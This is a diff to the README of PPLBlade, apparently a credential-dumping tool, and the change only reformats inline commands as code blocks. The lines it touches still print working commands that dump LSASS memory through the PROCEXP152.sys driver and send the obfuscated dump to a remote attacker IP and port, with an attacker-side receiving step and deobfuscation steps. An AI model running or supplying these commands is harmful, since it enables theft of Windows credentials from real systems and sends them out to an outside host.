@@ -74,11 +74,15 @@ PPLBlade.exe --mode cleanup
 
 Basic POC that uses PROCEXP152.sys to dump lsass:
 
-`PPLBlade.exe --mode dothatlsassthing`
+```
+PPLBlade.exe --mode dothatlsassthing
+```
 
 Upload the obfuscated LSASS dump onto a remote location:
 
-`PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234`
+```
+PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
+```
 
 Attacker host:
 ```
@@ -87,5 +91,7 @@ python3 deobfuscate.py --dumpname lsass.dmp
 ```
 
 Deobfuscate memory dump:
-`PPLBlade.exe --mode descrypt --dumpname PPLBlade.dmp --key PPLBlade`
+```
+PPLBlade.exe --mode descrypt --dumpname PPLBlade.dmp --key PPLBlade
+````
 
